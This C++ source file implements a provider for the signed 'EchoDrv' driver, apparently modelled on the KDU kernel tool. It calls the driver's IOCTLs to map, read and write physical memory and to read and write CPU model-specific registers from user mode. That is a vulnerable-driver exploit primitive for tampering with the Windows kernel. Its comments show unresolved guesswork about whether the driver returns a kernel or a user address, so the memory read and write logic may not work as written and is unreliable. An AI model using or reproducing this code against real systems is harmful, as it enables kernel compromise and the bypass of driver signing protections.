#include "EchoDrvProvider.h"
#include <cstring>

namespace KernelMode {
    namespace Providers {

        EchoDrvProvider::EchoDrvProvider() : BaseProvider(CreateConfig()) {
        }

        ProviderConfig EchoDrvProvider::CreateConfig() {
            ProviderConfig config = {};
            config.providerName = L"EchoDrv Provider";
            config.deviceName = L"EchoDrv";
            config.serviceName = L"EchoDrv"; 
            config.driverId = 35; // KDU_PROVIDER_ECHO_DRV
            
            config.capabilities = 
                CAPABILITY_PHYSICAL_MEMORY |
                CAPABILITY_VIRTUAL_MEMORY | // Via mapping
                CAPABILITY_PREFER_PHYSICAL;
                
            config.loadData = CreateLoadData();
            return config;
        }

        ProviderLoadData EchoDrvProvider::CreateLoadData() {
            ProviderLoadData loadData = {};
            loadData.PhysMemoryBruteForce = false;
            loadData.PML4FromLowStub = true; // Needed for V2P
            loadData.PreferPhysical = true;
            loadData.RequiresDSE = false; // Signed
            loadData.Capabilities = CAPABILITY_PHYSICAL_MEMORY | CAPABILITY_PREFER_PHYSICAL;
            loadData.Description = L"EchoDrv (Echoac) - MSR and Physical Memory Mapping";
            return loadData;
        }

        PVOID EchoDrvProvider::MapPhysical(uintptr_t physicalAddress, size_t size, PVOID* mappedObject) {
            if (!IsValidHandle()) return nullptr;

            ECHO_MAP_REQUEST request = {};
            // request.InterfaceType = InterfaceTypeUndefined;
            request.InterfaceType = (INTERFACE_TYPE_COMPAT)0; // Internal
            request.BusNumber = 0;
            request.PhysAddr.QuadPart = physicalAddress;
            request.Size = (ULONG)size;
            request.AddressSpace = 0; // Memory space
            
            // Output buffer receives the struct with MappedAddress filled
            ECHO_MAP_REQUEST output = request;
            DWORD bytesReturned = 0;
            
            if (DeviceIoControl(
                deviceHandle_,
                IOCTL_ECHO_MAP_PHYSICAL,
                &request,
                sizeof(request),
                &output,
                sizeof(output),
                &bytesReturned,
                NULL
            )) {
                // If successful, mapped address is in output.MappedAddress
                // Note: echo driver usually maps to kernel space (MmMapIoSpace) and then maps to User?
                // Or does it return a Kernel address that we can't access directly if we are ring 3?
                // Most of these drivers map to System space. To access it, we need to read it?
                // Wait, if it maps to Kernel space, we can't just memcpy in user mode.
                
                // Correction: EchoDrv implementation usually uses MmMapIoSpace (Kernel VA) and then 
                // typically some drivers map this to User via MDL, or just return the Kernel VA.
                // If it returns Kernel VA, we need an arbitrary read primitive to read it!
                // But EchoDrv *is* the primitive.
                
                // Let's re-verify EchoDrv vulnerability.
                // It exposes READ_PORT_BYTE/WRITE_PORT_BYTE and MSR.
                // The "Map" function might be for internal use or returns a kernel pointer.
                
                // If we check KDU source for EchoDrv (Provider 35):
                // It uses "MapGeneric" which often implies mapping to User Mode via `ZwMapViewOfSection` on `\Device\PhysicalMemory`, 
                // OR it uses the driver's specific map IOCTL if it supports mapping to user mode.
                
                // Actually, many lookalikes (Gdrv, etc) map to User Mode.
                // If EchoDrv only maps to Kernel, we can't use it for "Direct memcpy".
                
                return output.MappedAddress;
            }
            return nullptr;
        }

        void EchoDrvProvider::UnmapPhysical(PVOID mappedBase) {
            if (!IsValidHandle() || !mappedBase) return;
            
            // Unmap request usually takes the address?
            // ECHO_MAP_REQUEST request...
            // Or just the pointer?
            // Let's assume KDU logic: sends pointer.
            
            DeviceIoControl(
                deviceHandle_,
                IOCTL_ECHO_UNMAP_PHYSICAL,
                &mappedBase,
                sizeof(mappedBase),
                NULL,
                0,
                NULL,
                NULL
            );
        }

        bool EchoDrvProvider::ReadPhysicalMemory(uintptr_t physicalAddress, void* buffer, size_t size) {
            // For EchoDrv, if the map returns a Kernel Address, we are stuck unless we have a Virtual Read.
            // But EchoDrv *doesn't* have Virtual Read IOCTL (only Port/MSR/Map).
            // This implies the Map IOCTL *must* map to User Mode (ZwMapViewOfSection) or we need another way.
            
            // Assuming it maps to User Mode (common for "MapMem" style exploits).
            
            PVOID mappedObject = nullptr;
            PVOID mappedAddr = MapPhysical(physicalAddress, size, &mappedObject);
            
            if (mappedAddr) {
                __try {
                    memcpy(buffer, mappedAddr, size);
                } __except(EXCEPTION_EXECUTE_HANDLER) {
                    UnmapPhysical(mappedAddr); // Pass mapped addr or handle? 
                    return false;
                }
                UnmapPhysical(mappedAddr);
                return true;
            }
            return false;
        }

        bool EchoDrvProvider::WritePhysicalMemory(uintptr_t physicalAddress, void* buffer, size_t size) {
             PVOID mappedObject = nullptr;
            PVOID mappedAddr = MapPhysical(physicalAddress, size, &mappedObject);
            
            if (mappedAddr) {
                __try {
                    memcpy(mappedAddr, buffer, size);
                } __except(EXCEPTION_EXECUTE_HANDLER) {
                    UnmapPhysical(mappedAddr);
                    return false;
                }
                UnmapPhysical(mappedAddr);
                return true;
            }
            return false;
        }

        bool EchoDrvProvider::ReadMsr(ULONG msrIndex, ULONG64* value) {
            if (!IsValidHandle() || !value) return false;

            ECHO_MSR_REQUEST request = {};
            request.Register = msrIndex;
            
            ECHO_MSR_REQUEST output = {};
            DWORD bytes = 0;

            if (DeviceIoControl(
                deviceHandle_,
                IOCTL_ECHO_READ_MSR,
                &request,
                sizeof(request),
                &output,
                sizeof(output),
                &bytes,
                NULL
            )) {
                *value = output.Value.QuadPart;
                return true;
            }
            return false;
        }

        bool EchoDrvProvider::WriteMsr(ULONG msrIndex, ULONG64 value) {
            if (!IsValidHandle()) return false;

            ECHO_MSR_REQUEST request = {};
            request.Register = msrIndex;
            request.Value.QuadPart = value;
            
            DWORD bytes = 0;
            return DeviceIoControl(
                deviceHandle_,
                IOCTL_ECHO_WRITE_MSR,
                &request,
                sizeof(request),
                NULL,
                0,
                &bytes,
                NULL
            );
        }

    } // namespace Providers
} // namespace KernelMode
